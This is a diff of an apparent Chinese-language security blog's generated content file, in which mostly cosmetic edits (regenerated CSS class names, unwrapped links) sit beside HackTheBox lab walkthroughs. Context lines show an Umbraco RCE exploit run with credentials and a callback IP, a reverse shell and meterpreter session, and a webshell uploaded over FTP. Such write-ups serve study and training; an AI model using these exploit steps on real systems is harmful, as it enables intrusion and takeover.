@@ -3643,7 +3643,7 @@ Session completed.                          </code></pre>
 
 <img src="/posts/685379b3/image-20250223220501688.png" class="" title="查看版本">
 
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过检索可以在github 找到一个利用脚本：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0pvbm9hbnMvVW1icmFjby1SQ0U=">https://github.com/Jonoans/Umbraco-RCE<i class="fa fa-external-link-alt"></i></span></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过检索可以在github 找到一个利用脚本：<a href="https://github.com/Jonoans/Umbraco-RCE">https://github.com/Jonoans/Umbraco-RCE</a></p>
 <pre class="language-bash" data-language="bash"><code class="language-bash">$ python exploit.py <span class="token parameter variable">-u</span> admin@htb.local <span class="token parameter variable">-p</span> baconandcheese <span class="token parameter variable">-w</span> <span class="token string">'http://remote.htb'</span> <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.16.30
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Trying to <span class="token builtin class-name">bind</span> to :: on port <span class="token number">4444</span>: Done
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Waiting <span class="token keyword">for</span> connections on :::4444: Got connection from ::ffff:10.10.10.180 on port <span class="token number">49695</span>
@@ -3795,7 +3795,7 @@ meterpreter <span class="token operator">></span>
   <entry>
     <title>HTB-Love</title>
     <url>/posts/e5f5ab78.html</url>
-    <content><![CDATA[<style>.hxjtencjfosj{zoom:50%;}</style><img src="/posts/e5f5ab78/c00774d8d806b82c709c596937a92d14.png" class="hxjtencjfosj">
+    <content><![CDATA[<style>.ypqeoddwqcye{zoom:50%;}</style><img src="/posts/e5f5ab78/c00774d8d806b82c709c596937a92d14.png" class="ypqeoddwqcye">
 
 <span id="more"></span>
 
@@ -4003,7 +4003,7 @@ Server username: NT AUTHORITY<span class="token punctuation">\</span>SYSTEM</cod
   <entry>
     <title>HTB-BountyHunter</title>
     <url>/posts/d750c67f.html</url>
-    <content><![CDATA[<style>.mjfejueuhgep{zoom:50%;}</style><img src="/posts/d750c67f/a24c032885e56a17a6c74cc58b63e8f4.png" class="mjfejueuhgep">
+    <content><![CDATA[<style>.ueshgihxsrmf{zoom:50%;}</style><img src="/posts/d750c67f/a24c032885e56a17a6c74cc58b63e8f4.png" class="ueshgihxsrmf">
 
 <span id="more"></span>
 
@@ -4192,7 +4192,7 @@ __Ticket Code:__
   <entry>
     <title>HTB-DevOops</title>
     <url>/posts/ddc47498.html</url>
-    <content><![CDATA[<style>.hognlwermfgg{zoom:50%;}</style><img src="/posts/ddc47498/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="hognlwermfgg">
+    <content><![CDATA[<style>.hfcblwfyredg{zoom:50%;}</style><img src="/posts/ddc47498/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="hfcblwfyredg">
 
 <span id="more"></span>
 
@@ -4498,10 +4498,10 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <img src="/posts/e4955058/DraggedImage-10.png" class="" title="webapps">
 <p>进入<code>Apache Software Foundation\\Tomcat 9.0\\bin</code>, 点开tomcat9w –&gt; Java –&gt; Java options 添加<code>-Dfortify.home=E:\SSC\fortify </code>  –&gt; 修改内存(初始化4G，最大推荐16以上) –&gt; 应用, 然后启动Tomcat</p>
 <img src="/posts/e4955058/DraggedImage-11.png" class="">
-<style>.gjdsaxtptcgk{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-12.png" class="gjdsaxtptcgk" alt="修改配置">
-<style>.vnxvcopnrsql{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-13.png" class="vnxvcopnrsql">
+<style>.igivniuhhjnj{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-12.png" class="igivniuhhjnj" alt="修改配置">
+<style>.nmnvtqwykgxi{zoom:150%;}</style><img src="/posts/e4955058/DraggedImage-13.png" class="nmnvtqwykgxi">
 
-<h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4MDgwL3NzYy8=">http://127.0.0.1:8080/ssc/<i class="fa fa-external-link-alt"></i></span></p>
+<h4 id="安装SSC"><a href="#安装SSC" class="headerlink" title="安装SSC"></a>安装SSC</h4><p> 打开浏览器访问 <a href="http://127.0.0.1:8080/ssc/">http://127.0.0.1:8080/ssc/</a></p>
 <img src="/posts/e4955058/DraggedImage-14.png" class="" title="访问SSC">
 
 <p>打开上面配置的那个fortify home的路径，有个init.token文件，复制内容贴进去</p>
@@ -4536,7 +4536,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Jerry</title>
     <url>/posts/4797133e.html</url>
-    <content><![CDATA[<style>.wxvlobojyudv{zoom:50%;}</style><img src="/posts/4797133e/59f03a24178dbb2bdc94968c201e21f8.png" class="wxvlobojyudv">
+    <content><![CDATA[<style>.ngvfttjcmqje{zoom:50%;}</style><img src="/posts/4797133e/59f03a24178dbb2bdc94968c201e21f8.png" class="ngvfttjcmqje">
 
 <span id="more"></span>
 
@@ -4596,7 +4596,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Blue</title>
     <url>/posts/2c4131d1.html</url>
-    <content><![CDATA[<style>.ovhhgwdqgkcs{zoom:50%;}</style><img src="/posts/2c4131d1/52e077ae40899ab8b024afd51cb29b1c.png" class="ovhhgwdqgkcs">
+    <content><![CDATA[<style>.husmbegxhlxa{zoom:50%;}</style><img src="/posts/2c4131d1/52e077ae40899ab8b024afd51cb29b1c.png" class="husmbegxhlxa">
 
 <span id="more"></span>
 
@@ -4646,7 +4646,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Knife</title>
     <url>/posts/872a7a04.html</url>
-    <content><![CDATA[<style>.ygobvtpnllvp{zoom:50%;}</style><img src="/posts/872a7a04/110fe6608793064cf171080150ebd0dc.png" class="ygobvtpnllvp">
+    <content><![CDATA[<style>.nfrfcosddqtm{zoom:50%;}</style><img src="/posts/872a7a04/110fe6608793064cf171080150ebd0dc.png" class="nfrfcosddqtm">
 
 <span id="more"></span>
 
@@ -4713,7 +4713,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Shocker</title>
     <url>/posts/38c5e2d.html</url>
-    <content><![CDATA[<style>.uxvofndnymcu{zoom:50%;}</style><img src="/posts/38c5e2d/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="uxvofndnymcu">
+    <content><![CDATA[<style>.wetxheiiugxr{zoom:50%;}</style><img src="/posts/38c5e2d/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="wetxheiiugxr">
 
 <span id="more"></span>
 
@@ -4773,7 +4773,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Tenten</title>
     <url>/posts/78c78349.html</url>
-    <content><![CDATA[<style>.ipyrmssjsgvw{zoom:50%;}</style><img src="/posts/78c78349/e58a465e93364c423cd2162945f8f7bf.png" class="ipyrmssjsgvw">
+    <content><![CDATA[<style>.thvrfgiksive{zoom:50%;}</style><img src="/posts/78c78349/e58a465e93364c423cd2162945f8f7bf.png" class="thvrfgiksive">
 
 <span id="more"></span>
 
@@ -4853,7 +4853,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Bastard</title>
     <url>/posts/7134392b.html</url>
-    <content><![CDATA[<style>.rnaagmpfjkxu{zoom:50%;}</style><img src="/posts/7134392b/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="rnaagmpfjkxu">
+    <content><![CDATA[<style>.kkhywlwcrpiy{zoom:50%;}</style><img src="/posts/7134392b/a8d2ae87fbe6d1ccfe93522d74defb3a.png" class="kkhywlwcrpiy">
 
 <span id="more"></span>
 
@@ -4928,7 +4928,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Granny</title>
     <url>/posts/6b0d212.html</url>
-    <content><![CDATA[<style>.ybevjpxgbgcv{zoom:50%;}</style><img src="/posts/6b0d212/e8a122e2d713a4fb4a180bb9ccd20248.png" class="ybevjpxgbgcv">
+    <content><![CDATA[<style>.gebwhvmdxvfz{zoom:50%;}</style><img src="/posts/6b0d212/e8a122e2d713a4fb4a180bb9ccd20248.png" class="gebwhvmdxvfz">
 
 <span id="more"></span>
 
@@ -4987,7 +4987,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Grandpa</title>
     <url>/posts/c75d4146.html</url>
-    <content><![CDATA[<style>.adhsojjoiyhl{zoom:50%;}</style><img src="/posts/c75d4146/381683fd107da11f1dc916401ae8aee0.png" class="adhsojjoiyhl">
+    <content><![CDATA[<style>.fnbiiprxmhhz{zoom:50%;}</style><img src="/posts/c75d4146/381683fd107da11f1dc916401ae8aee0.png" class="fnbiiprxmhhz">
 
 <span id="more"></span>
 
@@ -5047,7 +5047,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Arctic</title>
     <url>/posts/d972b09f.html</url>
-    <content><![CDATA[<style>.ajrnmdesvuwr{zoom:50%;}</style><img src="/posts/d972b09f/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="ajrnmdesvuwr">
+    <content><![CDATA[<style>.pocuqwknqfkw{zoom:50%;}</style><img src="/posts/d972b09f/0d6275efbd5e48fcdc96e61b9724ae5e.png" class="pocuqwknqfkw">
 
 <span id="more"></span>
 
@@ -5120,7 +5120,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Legacy</title>
     <url>/posts/252e0fef.html</url>
-    <content><![CDATA[<style>.gbkwfzyfetjf{zoom:50%;}</style><img src="/posts/252e0fef/60dc190c4c015cfe3a3aef9b5afca254.png" class="gbkwfzyfetjf">
+    <content><![CDATA[<style>.rdflosuiiffy{zoom:50%;}</style><img src="/posts/252e0fef/60dc190c4c015cfe3a3aef9b5afca254.png" class="rdflosuiiffy">
 
 <span id="more"></span>
 
@@ -5168,7 +5168,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Devel</title>
     <url>/posts/97f065fe.html</url>
-    <content><![CDATA[<style>.nayvtryvngdk{zoom:50%;}</style><img src="/posts/97f065fe/0fb6455a29eb4f2682f04a780ce26cb1.png" class="nayvtryvngdk">
+    <content><![CDATA[<style>.mwckpfbjrlbi{zoom:50%;}</style><img src="/posts/97f065fe/0fb6455a29eb4f2682f04a780ce26cb1.png" class="mwckpfbjrlbi">
 
 <span id="more"></span>
 
@@ -5187,7 +5187,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <h3 id="Nmap-scan"><a href="#Nmap-scan" class="headerlink" title="Nmap scan"></a>Nmap scan</h3><img src="/posts/97f065fe/image-20250201213314487.png" class="" title="Nmap">
 
 <p>发现两个开放端口 21和80，FTP允许匿名登录，先登录FTP看看，FTP的目录底下是主站点的文件</p>
-<style>.gmeoirovwsfx{zoom:150%;}</style><img src="/posts/97f065fe/image-20250201213757511.png" class="gmeoirovwsfx" alt="登录FTP">
+<style>.fphdzmqupseb{zoom:150%;}</style><img src="/posts/97f065fe/image-20250201213757511.png" class="fphdzmqupseb" alt="登录FTP">
 
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>生成一个webshell然后通过ftp上传</p>
 <img src="/posts/97f065fe/image-20250201215256322.png" class="" title="生成webshell">
@@ -5229,7 +5229,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Lame</title>
     <url>/posts/465d4de8.html</url>
-    <content><![CDATA[<style>.ldnuvysbrblx{zoom:50%;}</style><img src="/posts/465d4de8/fb2d9f98400e3c802a0d7145e125c4ff.png" class="ldnuvysbrblx">
+    <content><![CDATA[<style>.lmtdsndgsffr{zoom:50%;}</style><img src="/posts/465d4de8/fb2d9f98400e3c802a0d7145e125c4ff.png" class="lmtdsndgsffr">
 
 <span id="more"></span>
 
@@ -5245,11 +5245,11 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.hzdjpymvnbls{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201155450222.png" class="hzdjpymvnbls" alt="Nmap">
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><style>.jajlbwkswxph{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201155450222.png" class="jajlbwkswxph" alt="Nmap">
 
 <p>发现两个可疑服务21(vsftpd 2.3.4)和445(Samba 3.0.20)，使用searchsploit 检索可用exp<img src="/posts/465d4de8/image-20250201160141376.png" class="" title="searchploit"></p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用vsftpd的漏洞，失败，换smb漏洞, 成功</p>
-<style>.defqisplzbic{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201174838005.png" class="defqisplzbic" alt="msfconsole">
+<style>.hdqdrkvookyb{zoom:150%;}</style><img src="/posts/465d4de8/image-20250201174838005.png" class="hdqdrkvookyb" alt="msfconsole">
 
 <img src="/posts/465d4de8/image-20250201175040335.png" class="" title="searchsploit">
 
@@ -5282,7 +5282,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Optimum</title>
     <url>/posts/f7bd0d80.html</url>
-    <content><![CDATA[<style>.whxbtnkzfqlc{zoom:50%;}</style><img src="/posts/f7bd0d80/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="whxbtnkzfqlc">
+    <content><![CDATA[<style>.jhtlzrumqpdq{zoom:50%;}</style><img src="/posts/f7bd0d80/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="jhtlzrumqpdq">
 
 <span id="more"></span>
 
@@ -5344,7 +5344,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
   <entry>
     <title>HTB-Beep</title>
     <url>/posts/48ffce4.html</url>
-    <content><![CDATA[<style>.lpdcgosanpkx{zoom:50%;}</style><img src="/posts/48ffce4/995f465295b99869fce21ecadea4604c.png" class="lpdcgosanpkx">
+    <content><![CDATA[<style>.xbuxmwgrqolm{zoom:50%;}</style><img src="/posts/48ffce4/995f465295b99869fce21ecadea4604c.png" class="xbuxmwgrqolm">
 
 <span id="more"></span>
 
@@ -5365,7 +5365,7 @@ oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
 <p>添加映射</p>
 <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"10.10.10.7  beep.htb"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/hosts</code></pre>
 
-<p>访问<span class="exturl" data-url="aHR0cHM6Ly9iZWVwLmh0Yi8=">https://beep.htb<i class="fa fa-external-link-alt"></i></span> 发现新版火狐浏览器不支持低版本SSL，修改浏览器配置，地址栏输入<code>about:config</code> , 输入<code>security.tls.version.min</code> 修改值为1 </p>
+<p>访问<a href="https://beep.htb/">https://beep.htb</a> 发现新版火狐浏览器不支持低版本SSL，修改浏览器配置，地址栏输入<code>about:config</code> , 输入<code>security.tls.version.min</code> 修改值为1 </p>
 <img src="/posts/48ffce4/image-20250202170324934.png" class="" title="修改火狐配置">
 
 <img src="/posts/48ffce4/image-20250202170450821.png" class="" title="访问目标">
